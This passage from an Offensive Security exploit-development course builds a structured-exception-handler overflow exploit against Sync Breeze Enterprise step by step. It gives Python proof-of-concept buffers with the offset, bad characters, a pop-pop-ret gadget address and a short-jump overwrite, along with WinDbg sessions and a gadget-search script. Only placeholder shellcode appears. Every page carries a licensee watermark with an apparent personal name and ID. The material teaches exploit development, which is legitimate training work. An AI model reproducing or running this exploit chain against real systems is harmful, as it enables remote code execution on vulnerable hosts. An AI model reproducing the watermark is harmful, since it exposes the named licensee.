Listing 119 - Creating a unique string using msf-pattern_create 
We’ll replace our current inputBuffer with this unique string to help determine the exact offset of 
our overflow. 
... 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" 
 ... 
Listing 120 - seh_overflow_0x02.py: Determining the offset of our overflow 
Running our updated proof of concept again triggers the access violation: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
115 
(1254.c78): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Sync Breeze Enterprise\bin\libpal.dll -  
eax=63413163 ebx=0155fa1c ecx=0155ff18 edx=0155f9d4 esi=0155ff18 edi=0155fb20 
eip=00582a9d esp=0155f9a8 ebp=0155fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:63413187=???????? 
 
0:009> !exchain 
0155fe1c: libpal!md5_starts+149fb (005fdf5b) 
0155ff54: 33654132 
Invalid exception stack at 65413165 
Listing 121 - Overwritting the exception handler with our unique pattern 
This time, however, the !exchain output indicates that the exception handler has been 
overwritten by our unique pattern. 
We’ll input this unique pattern into msf-pattern_offset to find the exact offset for our 
overwrite. 
kali@kali:~$ msf-pattern_offset -l 1000 -q 33654132 
[*] Exact match at offset 128 
Listing 122 - Using msf-pattern_offset to determine the offset of the overwrite 
The output indicates that the required offset is 128 bytes. 
Let’s update our proof of concept to confirm that this is the correct offset. 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  inputBuffer = b"\x41" * 128 
  inputBuffer+= b"\x42\x42\x42\x42" 
  inputBuffer+= b"\x43" * (size - len(inputBuffer)) 
Listing 123 - seh_overflow_0x03.py: Confirming the offset of our overflow 
If our offset is correct, the above proof of concept should overwrite the target exception handler 
with four 0x42 bytes. 
(db4.7b8): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Sync Breeze Enterprise\bin\libpal.dll -  
eax=41414141 ebx=013afa1c ecx=013aff18 edx=013af9d4 esi=013aff18 edi=013afb20 
eip=00582a9d esp=013af9a8 ebp=013afec8 iopl=0         nv up ei pl nz na po nc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
116 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
 
0:007> !exchain 
013afe1c: libpal!md5_starts+149fb (005fdf5b) 
013aff54: 42424242 
Invalid exception stack at 41414141 
Listing 124 - Confirming the offset of our overflow in WinDbg 
After sending our latest proof of concept and analyzing the crash in WinDbg, we confirm that we 
can overwrite the exception handler with an arbitrary address (Listing 124). 
Now that we are able to precisely overwrite the exception handler and we have a plan to redirect 
the execution into our controlled buffer, we’re ready for the next steps of the exploit development 
process. 
4.5.2.1 Exercises 
1. 
Use WinDbg to better understand the arguments passed to the _except_handler function. 
2. 
What other assembly instruction sequences might achieve the same goal as the P/P/R 
instruction sequence? 
3. 
Update the previous proof of concept to control the DWORD that overwrites the SEH. 
4.5.3 Detecting Bad Characters 
Before we start searching for a suitable P/P/R instruction sequence, or generate our shellcode, 
we should check for bad characters. We need to determine which bytes to avoid in the address of 
the P/P/R sequence and in our shellcode. 
Let’s modify our proof of concept again by adding every possible hex character to our input 
buffer. We’ll immediately exclude 0x00, as the null byte is typically a bad character in stack 
overflows. 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  badchars = ( 
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d" 
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a" 
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27" 
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34" 
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41" 
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e" 
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b" 
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68" 
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75" 
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82" 
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f" 
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c" 
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9" 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
117 
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6" 
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3" 
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd" 
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea" 
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7" 
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 
 
  inputBuffer = b"\x41" * 128 
  inputBuffer+= b"\x42\x42\x42\x42" 
  inputBuffer+= badchars 
  inputBuffer+= b"\x43" * (size - len(inputBuffer)) 
Listing 125 - seh_overflow_0x04.py: Detecting bad characters 
After running our updated proof of concept, we’ll let the application try to handle the exception 
with the WinDbg g command. 
(180.c54): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program 
Files\Sync Breeze Enterprise\bin\libpal.dll -  
eax=41414141 ebx=0132fa1c ecx=0132ff18 edx=0132f9d4 esi=0132ff18 edi=0132faa2 
eip=00582a9d esp=0132f9a8 ebp=0132fec8 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00582a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
 
0:007> g 
(180.c54): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=00000000 ecx=42424242 edx=77f16b30 esi=00000000 edi=00000000 
eip=42424242 esp=0132f338 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
42424242 ??              ??? 
Listing 126 - Letting the application handle the exception 
As expected, we gain control over the instruction pointer. We can now dump the bytes (db) 
pointed to by the second argument (EstablisherFrame) passed to the _except_handler function. 
We can get this argument from the stack at offset 0x08 from ESP: 
0:007> dds esp L5 
0132f338  77f16b12 ntdll!ExecuteHandler2+0x26 
0132f33c  0132f440 
0132f340  0132ff54 
0132f344  0132f45c 
0132f348  0132f3cc 
 
0:007> db 0132ff54  
0132ff54  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00  AAAABBBB......[. 
0132ff64  10 3e 5b 00 28 73 a0 00-72 40 5b 00 58 cf 9f 00  .>[.(s..r@[.X... 
... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
118 
Listing 127 - Checking the bad characters in memory using WinDbg 
Inspecting the WinDbg output from Listing 127, we notice that our buffer was truncated right after 
the 0x01 character, meaning that 0x02 is a bad character for our exploit. 
After repeating this process several times we locate all the bad characters: 
0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD 
Listing 128 - List of bad characters 
Now that we know which bytes to avoid in our exploit, we’ll move on to finding a P/P/R instruction 
sequence. 
4.5.3.1 Exercise 
1. 
Detect the bad characters for our exploit and confirm that the list given in this section is 
indeed complete. 
4.5.4 Finding a P/P/R Instruction Sequence 
To redirect the execution flow to our buffer, we need to find a P/P/R instruction sequence. First, 
however, we must consider the various protections that SEH overflows have to deal with. 
We could attempt to examine each application module manually, but this is both tedious and time 
consuming. Let’s speed things up with automated tools that check the DllCharacteristics member 
of each module and provide details about the protections in place. 
We’ll use the WinDbg narly113 extension, which generates a list of all loaded modules and their 
respective protections. The extension is already installed on our dedicated Windows client, so 
we’ll simply .load it. 
0:007> .load narly 
... 
             by Nephi Johnson (d0c_s4vage) 
                      N for gnarly! 
 
Available commands: 
 
    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for 
                all loaded modules 
Listing 129 - Loading narly inside WinDbg 
The extension loads and immediately presents us with the available commands. In this case, 
narly only supports the !nmod command. Executing !nmod outputs a list of all loaded modules 
and their memory protections, as shown in Listing 130: 
0:007> !nmod 
00330000 003e5000 libsync              /SafeSEH OFF                C:\Program 
Files\Sync Breeze Enterprise\bin\libsync.dll 
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program 
Files\Sync Breeze Enterprise\bin\syncbrs.exe 
 
113 (Narly), https://code.google.com/archive/p/narly/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
119 
00570000 00644000 libpal               /SafeSEH OFF                C:\Program 
Files\Sync Breeze Enterprise\bin\libpal.dll 
10000000 10226000 libspp               /SafeSEH OFF                C:\Program 
Files\Sync Breeze Enterprise\bin\libspp.dll 
6cc70000 6cd09000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\SYSTEM32\ODBC32.dll 
... 
77d40000 77e74000 USER32               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\USER32.dll 
77e80000 77ffa000 ntdll                /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\SYSTEM32\ntdll.dll 
 
*DEP/*ASLR means that these modules are compatible with ASLR/DEP 
Listing 130 - Using narly to get memory protections of the loaded modules 
The output displays “/SafeSEH OFF”, which indicates that this application and its modules are 
compiled without SafeSEH. Since DEP114 and ASLR115 are not displayed, they are also disabled. 
The most common way to bypass the SafeSEH protection is to leverage the POP 
R32, POP R32, RET instruction sequence from a module that was compiled 
without the /SAFESEH flag. 
We want to make our exploit as reliable and portable116 as possible against multiple Windows 
operating systems, so we will try to find a POP R32, POP R32, RET instruction sequence located 
inside a module that is part of the vulnerable software. This ensures that it will be present on 
every installation of the software (regardless of Windows version). 
The libspp.dll application DLL is a perfect candidate. It is compiled without any protections and is 
loaded in a memory range which does not contain null bytes. 
In a previous module, we used the WinDbg s117 command to search for the “jmp esp” opcodes. 
We could also use this to search for the P/P/R sequence, but this would be time-consuming given 
the number of registers the POP instruction can use. 
To speed things up, we’ll write a small script to search for a P/P/R instruction sequence. We 
learned in an earlier module that we can issue actions whenever breakpoints are hit. However, we 
can also leverage custom-written scripts within WinDbg. 
There are two common approaches to writing WinDbg scripts. First, we could use WinDbg classic 
scripts. These are normal WinDbg commands wrapped with a few control flow commands. They 
use pseudo-registers and don’t have variables. Second, we could use pykd, a powerful WinDbg 
 
114 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention 
115 (Michael Howard, 2006), https://blogs.msdn.microsoft.com/michael_howard/2006/05/26/address-space-layout-randomization-in-
windows-vista/ 
116 The portability of an exploit refers to the ability to reuse the same exploit code while attaching the vulnerable application on 
different versions of the operating system (Windows 7, Windows 10, etc.) 
117 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/s--search-memory- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
120 
Python wrapper. This is typically used in more complex tools, which we’ll cover in later modules. 
For this exercise, we’ll leverage a classic script. 
The new version of WinDbg Preview comes with a built-in JavaScript scripting 
engine. This is mainly intended for the new WinDbg Preview version and will not 
be covered in this course. 
Before writing our script, we’ll need to determine the specific opcodes and the address range we’ll 
search. 
We could also leverage mona.py for this but as of this writing, it does not work 
with Python 3, which is provided on the dedicated Windows client. 
Since we are going to search through libspp.dll, we’ll retrieve the start and end memory addresses 
with WinDbg: 
0:007> lm m libspp 
Browse full module list 
start    end        module name 
10000000 10226000   libspp   C (export symbols)       C:\Program Files\Sync Breeze 
Enterprise\bin\libspp.dll 
Listing 131 - Getting the memory range of libspp.dll 
Next, we must gather all possible opcodes for the POP instructions for each x86 register, 
excluding the stack pointer (ESP). We will also need the opcode for the ret instruction. Let’s use 
the msf-nasm_shell utility to collect this information. 
We need to avoid the use of a “pop esp” instruction as it would set the stack 
pointer to an arbitrary address, which would completely disrupt the stack frame. 
kali@kali:~$ msf-nasm_shell  
nasm > pop eax 
00000000  58                pop eax 
 
nasm > pop ebx 
00000000  5B                pop ebx 
 
nasm > pop ecx 
00000000  59                pop ecx 
 
nasm > pop edx 
00000000  5A                pop edx 
 
nasm > pop esi 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
121 
00000000  5E                pop esi 
 
nasm > pop edi 
00000000  5F                pop edi 
 
nasm > pop ebp 
00000000  5D                pop ebp 
 
nasm > ret 
00000000  C3                ret 
Listing 132 - Obtaining all opcodes for the POP and RET instructions 
The output indicates that the generated opcodes are arranged consecutively, from 0x58 to 0x5F. 
We can use this in our script logic to create every possible POP R32 combination: 
.block 
{ 
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01) 
    { 
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01) 
        { 
            s-[1]b 10000000 10226000 $t0 $t1 c3 
        } 
    } 
} 
Listing 133 - find_ppr.wds - WinDbg script to locate P/P/R instruction sequences 
The script in Listing 133 starts with a .block control flow, which introduces a block of statements. 
Any aliases or pseudo-registers that are changed within the block will not be updated outside of it. 
We can implement the search using two .for loops. Each loop will use the t0, and t1 pseudo-
registers respectively. These pseudo-registers will be set to 0x58 and incremented by 0x01 each 
time the loop runs until they reach 0x5F. 
Inside the second loop, we find the s search command followed by the 1 flag, which only displays 
the memory address where the opcodes are found. Next, we hardcoded the start and end 
address of libspp.dll, then used our two pseudo-registers to retrieve every possible POP R32, POP 
R32 instruction sequence. Finally, we added the last opcode for the RET instruction. 
The script in Listing 133 is saved on the hard disk as a “.wds” file. This extension 
is not necessary, although it is conventionally used by various script writers. 
After saving our script to a file, we can execute it from WinDbg118 with the $>< command followed 
by the path to our script, as shown below: 
0:007> $><C:\Users\offsec\Desktop\find_ppr.wds 
0x1015a2f0 
0x100087dd 
0x10008808 
 
118 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-----------------------a---run-script-file- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
122 
0x1000881a 
0x10008829 
0x1001bb8a 
0x1001bc1f 
0x100491e4 
... 
Listing 134 - Finding P/P/R instruction sequences using the find_ppr.wds script 
The script returns a list of memory addresses from the libspp.dll module. We’ll select the first 
returned address (0x1015a2f0) and confirm that it points to a P/P/R instruction sequence. 
0:009> u 1015a2f0 L3 
libspp!pcre_exec+0x16460: 
1015a2f0 58              pop     eax 
1015a2f1 5b              pop     ebx 
1015a2f2 c3              ret 
Listing 135 - Validate the success of the script 
Good. The address points to valid sequence of instructions and does not contain bad characters. 
Now that we have obtained a valid memory address for our P/P/R instruction sequence, let’s 
update our proof of concept and try to overwrite the instruction pointer with it: 
... 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  inputBuffer = b"\x41" * 128 
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret 
  inputBuffer+= b"\x43" * (size - len(inputBuffer)) 
... 
Listing 136 - seh_overflow_0x05.py: Executing the P/P/R sequence 
When we run the updated proof of concept, we again trigger the access violation: 
(184c.7dc): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll 
eax=41414141 ebx=018ffa1c ecx=018fff18 edx=018ff9d4 esi=018fff18 edi=018ffb20 
eip=00922a9d esp=018ff9a8 ebp=018ffec8 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 
libpal!SCA_ConfigObj::Deserialize+0x1d: 
00922a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=???????? 
 
0:008> !exchain 
018ffe1c: libpal!md5_starts+149fb (0099df5b) 
018fff54: libspp!pcre_exec+16460 (1015a2f0) 
Invalid exception stack at 41414141 
 
0:008> u 1015a2f0 L3 
libspp!pcre_exec+0x16460: 
1015a2f0 58              pop     eax 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
123 
1015a2f1 5b              pop     ebx 
1015a2f2 c3              ret 
Listing 137 - Overwriting the _except_handler function with our P/P/R instruction sequence 
Inspecting the exception chain (Listing 137), we find that we have successfully overwritten the 
structured exception handler with the memory address of our POP R32, POP R32, RET instruction 
sequence. 
At this point, we want to set up a software breakpoint at the address of our P/P/R sequence and 
let the debugger goto handle the exception. This should redirect the execution flow and hit our 
breakpoint. 
0:008> bp 0x1015a2f0 
 
0:008> g 
Breakpoint 0 hit 
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=1015a2f0 esp=018ff438 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
libspp!pcre_exec+0x16460: 
1015a2f0 58              pop     eax 
Listing 138 - Setting and hitting the breakpoint at the P/P/R 
Let’s single-step through the POP instructions and inspect the address we will be returning into: 
0:008> r 
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=1015a2f0 esp=018ff438 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
libspp!pcre_exec+0x16460: 
1015a2f0 58              pop     eax 
 
0:008> t 
eax=77383b02 ebx=00000000 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=1015a2f1 esp=018ff43c ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
libspp!pcre_exec+0x16461: 
1015a2f1 5b              pop     ebx 
 
0:008> t 
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=1015a2f2 esp=018ff440 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
libspp!pcre_exec+0x16462: 
1015a2f2 c3              ret 
 
0:008> dd poi(esp) L8 
018fff54  41414141 1015a2f0 43434343 43434343 
018fff64  43434343 43434343 43434343 43434343 
 
0:008> t 
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=018fff54 esp=018ff444 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
018fff54 41              inc     ecx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
124 
Listing 139 - Single-stepping through the P/P/R instruction sequence 
Great! Listing 139 shows that after executing the RET instruction, we returned into the stack 
within our controlled buffer right before our _except_handler address. This happens because the 
EstablisherFrame points to the beginning of the _EXCEPTION_REGISTRATION_RECORD structure, 
which starts with the Next member followed by the _except_handler address. 
In this section, we leveraged the narly extension to list the protections on the currently loaded 
modules and find a suitable module to search for a P/P/R instruction sequence. We also covered 
the concept of scripting inside WinDbg and wrote a simple script to automate the process of 
searching for P/P/R instruction sequences. 
Finally, we updated our proof of concept with the new P/P/R instruction sequence and confirmed, 
inside the debugger, that we can successfully redirect the execution flow to our controlled buffer. 
4.5.4.1 Exercises 
1. 
Use narly to list the protections of all loaded modules. 
2. 
Write a WinDbg script that will search for P/P/R instruction sequences. 
3. 
Change the previously-written script to accept the start and end addresses as arguments 
rather than hardcoding them. 
4. 
Can you modify the script to avoid searching for the POP ESP opcode? 
5. 
Update the previous proof of concept and overwrite the SEH with the address of a P/P/R 
instruction sequence. 
6. 
Single-step through the sequence and determine where the execution flow will end up after 
the RET instruction. 
4.5.5 Island-Hopping in Assembly 
As we discussed in the theory section of this module, the EXCEPTION_REGISTRATION_RECORD 
structure begins with the Next member. Once we redirect execution to this member on the stack 
with a P/P/R sequence, the CPU will execute the assembly instructions generated by the opcodes 
that compose the P/P/R memory address. Let’s inspect the resulting assembly instruction inside 
WinDbg. 
0:008> u eip L8 
018fff54 41              inc     ecx 
018fff55 41              inc     ecx 
018fff56 41              inc     ecx 
018fff57 41              inc     ecx 
018fff58 f0a215104343    lock mov byte ptr ds:[43431015h],al 
018fff5e 43              inc     ebx 
018fff5f 43              inc     ebx 
018fff60 43              inc     ebx 
0:008> dd 0x43431015 L4 
43431015  ???????? ???????? ???????? ???????? 
Listing 140 - Assembly instruction generated from the P/P/R address opcodes 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
125 
Listing 140 shows that the bytes composing the P/P/R address are translated to a lock mov 
byte119 instruction when executed as code. This instruction uses part of our buffer as a 
destination address (43431015h) to write the content of the AL register. Because this memory 
address is not mapped, executing this instruction will trigger another access violation and break 
our exploit. 
We can overcome this by using the first four bytes of the Next structure exception handler (NSEH) 
to assemble an instruction that will jump over the current SEH and redirect us into our fake 
shellcode located after the P/P/R address. This is known as a “short jump” in assembly. 
In assembly, short jumps are also known as short relative jumps. These jump 
instructions can be relocated anywhere in memory without requiring a change of 
opcode. The first opcode of a short jump is always 0xEB and the second opcode 
is the relative offset, which ranges from 0x00 to 0x7F for forward short jumps, 
and from 0x80 to 0xFF for backwards short jumps. 
After single-stepping through the P/P/R instructions, we will use the a120 command to assemble 
the short jump and obtain its opcodes: 
0:008> r 
eax=77383b02 ebx=018ff540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000 
eip=018fff54 esp=018ff444 ebp=018ff458 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
018fff54 41              inc     ecx 
 
0:008> dds eip L4 
018fff54  41414141 
018fff58  1015a2f0 libspp!pcre_exec+0x16460 
018fff5c  43434343 
018fff60  43434343 
 
0:008> a 
018fff54 jmp 0x018fff5c 
jmp 0x018fff5c 
018fff56  
 
0:008> u eip L1 
018fff54 eb06            jmp     018fff5c 
 
0:008> dds eip L4 
018fff54  414106eb 
018fff58  1015a2f0 libspp!pcre_exec+0x16460 
018fff5c  43434343 
018fff60  43434343 
Listing 141 - Assembling and getting the opcodes for the short jump 
 
119 (LOCK - x86 Instruction Set Reference), https://c9x.me/x86/html/file_module_x86_id_159.html 
120 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/a--assemble- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
126 
The assemble command takes an address as an argument, which is where the 
instructions should be assembled in memory. Without arguments, WinDbg will 
assemble at the location of the instruction pointer. 
As shown in the listing above, the offset for the jump is six bytes rather than four (the length of 
the P/P/R address). This is because the offset is calculated from the beginning of the jump 
instruction, which includes the 0xEB and the offset itself. 
Now that we have the short jump, let’s update our proof of concept to include it: 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  inputBuffer = b"\x41" * 124 
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH) 
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret 
  inputBuffer+= b"\x41" * (size - len(inputBuffer)) 
Listing 142 - seh_overflow_0x06.py: Jumping over the current SEH 
After executing the updated proof of concept and generating an access violation in WinDbg, we 
can set a breakpoint at the P/P/R instruction sequence and let the debugger continue until it hits 
our breakpoint. Next, we’ll single-step through the POP, POP, RET instructions and reach our short 
jump: 
0:007> r 
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000 
eip=0132ff54 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0132ff54 90              nop 
 
0:007> t 
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000 
eip=0132ff55 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0132ff55 90              nop 
 
0:007> t 
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000 
eip=0132ff56 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0132ff56 eb06            jmp     0132ff5e 
 
0:007> dd 0132ff5e - 0x06 
0132ff58  1015a2f0 41414141 41414141 41414141 
0132ff68  41414141 41414141 41414141 41414141 
0132ff78  41414141 41414141 41414141 41414141 
0132ff88  41414141 41414141 41414141 41414141 
0132ff98  41414141 41414141 41414141 41414141 
0132ffa8  41414141 41414141 41414141 41414141 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
127 
0132ffb8  41414141 41414141 41414141 41414141 
0132ffc8  41414141 41414141 41414141 41414141 
Listing 143 - Jumping over the current SEH in WinDbg 
The listing above confirms that if we execute the short jump, we will indeed land in our buffer 
right after the SEH. 
After carefully reviewing the memory pointed to by the instruction pointer, we notice that we are 
very close to reaching the beginning of our stack, as shown below: 
0:007> dd eip L30 
0132ff56  a2f006eb 41411015 41414141 41414141 
0132ff66  41414141 41414141 41414141 41414141 
0132ff76  41414141 41414141 41414141 41414141 
0132ff86  41414141 41414141 41414141 41414141 
0132ff96  41414141 41414141 41414141 41414141 
0132ffa6  41414141 41414141 41414141 41414141 
0132ffb6  41414141 41414141 41414141 41414141 
0132ffc6  41414141 41414141 41414141 41414141 
0132ffd6  41414141 ff004141 008d0132 ffff77ed 
0132ffe6  6c77ffff 000077f1 00000000 3e100000 
0132fff6  7170005b 000000a0 ???????? ???????? 
01330006  ???????? ???????? ???????? ???????? 
 
0:007> !teb 
TEB at 7ffd8000 
    ExceptionList:        0132f34c 
    StackBase:            01330000 
    StackLimit:           0132e000 
... 
Listing 144 - Reaching the beginning of our stack 
This amount of space may fit a small shellcode, but we would certainly prefer reverse-shell 
shellcode in our exploit. Our proof of concept sends a large amount of data (1000 bytes), so let’s 
search the stack and see if we can find it. 
Before searching, let’s update our proof of concept and add a shellcode variable containing 
dummy shellcode: 
... 
try: 
  server = sys.argv[1] 
  port = 9121 
  size = 1000 
 
  shellcode = b"\x43" * 400 
 
  inputBuffer = b"\x41" * 124 
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH) 
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret 
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) 
  inputBuffer+= shellcode 
... 
Listing 145 - seh_overflow_0x07.py: Sending a fake shellcode to locate it on the stack 
OS-555704 RAYMOND ALLEN SORENG
 
 
